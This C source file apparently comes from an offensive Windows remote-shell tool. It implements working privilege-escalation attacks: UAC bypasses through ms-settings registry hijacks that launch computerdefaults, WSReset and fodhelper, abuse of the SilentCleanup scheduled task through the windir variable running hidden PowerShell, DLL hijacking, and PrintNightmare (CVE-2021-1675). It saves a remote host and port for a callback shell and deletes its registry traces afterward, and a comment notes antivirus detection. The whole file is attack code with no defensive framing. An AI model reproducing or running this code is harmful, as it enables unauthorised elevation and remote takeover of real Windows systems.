#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"
#include "CheckSystem.h"
#include "DllHijacking.h"
#include "PrintNightmareLPE.h"

#include "LoadAPI.h"

#define MAX_CLEANUP_TRY     10
#define SLEEP_1_SEC         1000

#define MAX_BUFFER          1024

typedef struct {
    char* exploitName;
    char* regKeyName;
    char* targetExe;
} UAC_BYPASS_DATA;

UAC_BYPASS_DATA uac_bypass_data[] = {
    // To many Anti-Virus detect this module as a exploit ! (e.g. Windows Defender/Avast/...)
    /*{"fodhelper", "ms-settings", "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "C:\\Windows\\System32\\fodhelper.exe"},*/
    {"computerdefaults", "ms-settings",  "C:\\Windows\\System32\\computerdefaults.exe"},
    {"WSReset", "AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2","C:\\Windows\\System32\\WSReset.exe"},
};

BOOL ExploitCleanUp(Advapi32_API advapi32, char* regPath, char* regName) {
    char* lpSubKey = (char*)malloc(MAX_PATH + 1);
    if (lpSubKey != NULL) {
        BOOL result;
        sprintf_s(lpSubKey, MAX_PATH + 1, "%s\\%s", regPath, regName);
        result = RegDelnodeRecurse(advapi32, HKEY_CURRENT_USER, lpSubKey);
        free(lpSubKey);
        return result;
    }
        
    return FALSE;
}

BOOL ExploitSilentCleanup(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port) {
    BOOL returnValue = FALSE;
    PVOID pOldVal = NULL;

    char* command = (char*)malloc(MAX_BUFFER);
    if (command == NULL)
        return FALSE;

    sprintf_s(command, MAX_BUFFER, "powershell -windowstyle hidden %s;exit;", PathExeToRun);

    DisableWindowsRedirection(&pOldVal);
    if (SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
        if (SaveRHostInfo(advapi32, ipAddress, port)) {

            // schtasks.exe error ???
            returnValue = Run(shell32,"schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
        } else
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");

        ExploitCleanUp(advapi32, "Environment", "windir");
    }
    RevertWindowsRedirection(pOldVal);

    free(command);
    return returnValue;
}


BOOL ExploitOpenShell(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
    BOOL returnValue = FALSE;
    PVOID pOldVal = NULL;
    char* regKey = (char*)malloc(MAX_PATH +1);

    if (regKey == NULL)
        return FALSE;
    sprintf_s(regKey, MAX_PATH, "Software\\Classes\\%s\\Shell\\Open\\command", uac_bypass_data[UacBypassTec].regKeyName);
    

    DisableWindowsRedirection(&pOldVal);

    if (checkKey(advapi32, regKey)) {
        returnValue = SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
        returnValue &= SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
        if (returnValue) {
            if (SaveRHostInfo(advapi32, ipAddress, port)) {
                returnValue = RunAs(shell32, uac_bypass_data[UacBypassTec].targetExe, NULL);
            }else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
        }
        ExploitCleanUp(advapi32, "Software\\Classes", uac_bypass_data[UacBypassTec].regKeyName);
    }
    RevertWindowsRedirection(pOldVal);

    free(regKey);
    return returnValue;
}
BOOL ExploitCurVer(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port){
    PVOID pOldVal = NULL;
    const char* regKeys[] = {
        "Software\\Classes\\%s","\\Shell\\Open\\command",
        "Software\\Classes\\ms-settings\\CurVer"
    };
    BOOL returnValue = FALSE;
    size_t regKeyCommandLen = strlen(regKeys[0]) + strlen(regKeys[1]) + 4;
    char* regKeyCommand = (char*)malloc(regKeyCommandLen);
    if (regKeyCommand == NULL)
        return FALSE;
    char* extName = (char*)malloc(4 + 1);
    if (extName == NULL){
        free(regKeyCommand);
        return FALSE;
    }

    extName[0] = '.';


    GenRandDriverName(extName + 1, 3);
    sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
    while (CheckExistKey(advapi32, regKeyCommand) && strcmp(extName, ".pwn") != 0){
        GenRandDriverName(extName + 1, 3);
        sprintf_s(regKeyCommand, regKeyCommandLen, regKeys[0], extName);
    }
    strcat_s(regKeyCommand, regKeyCommandLen, regKeys[1]);

    DisableWindowsRedirection(&pOldVal);
    if (checkKey(advapi32, regKeyCommand) && checkKey(advapi32, regKeys[2])){
        returnValue = SetRegistryValue(advapi32, HKEY_CURRENT_USER, regKeyCommand, "", PathExeToRun);
        returnValue &= SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKeys[2], "", extName);
        if (returnValue){
            if (SaveRHostInfo(advapi32, ipAddress, port)){
                returnValue = ((int)shell32.ShellExecuteAF(NULL, "runas", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_SHOWNORMAL) > 32);
                Sleep(1000);
            } else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
            ExploitCleanUp(advapi32, (char*)"Software\\Classes", "ms-settings");
            ExploitCleanUp(advapi32, (char*)"Software\\Classes", extName);
        }
    }
    RevertWindowsRedirection(pOldVal);

    free(extName);
    free(regKeyCommand);
    return returnValue;
}



BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
    BOOL returnValue = FALSE;
    if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
        printMsg(STATUS_OK, LEVEL_DEFAULT, "Local Privilege Escalation: 'PrintNightmare - (CVE-2021-1675)'\n");
        returnValue = ExploitPrintNightmareLPE(kernel32,  advapi32, cabinetAPI, PathExeToRun, ipAddress, port, wincatDefaultDir);
    } else{
        if (!IsUACEnabled(advapi32)){
            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
            if (!SaveRHostInfo(advapi32, ipAddress, port)){
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
                return FALSE;
            }
            return RunAs(shell32, PathExeToRun, NULL);
        } else{
            UAC_POLICY uacPolicy = CheckUACSettings(advapi32);
            if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE){

                if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN){
                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
                    returnValue = ExploitSilentCleanup(advapi32, shell32, PathExeToRun, ipAddress, port);

                } else if (UacBypassTec == UAC_BYPASS_FOD_HELP_CUR_VER){
                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Fodhelper - CurVer'\n");
                    returnValue = ExploitCurVer(advapi32, shell32, PathExeToRun, ipAddress, port);
                } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){

                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
                    returnValue = ExploitTrustedDirectories(kernel32, advapi32, shell32, cabinetAPI, PathExeToRun, ipAddress, port);
                } else{
                    if (UacBypassTec >= 0 && UacBypassTec < 2) {
                        printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
                        returnValue = ExploitOpenShell(advapi32, shell32, PathExeToRun, ipAddress, port, UacBypassTec);
                    }
                    else {
                        printf("\t[x] Error var UacBypassTec\n");
                    }

                }
            }
        }
    }
    return returnValue;
}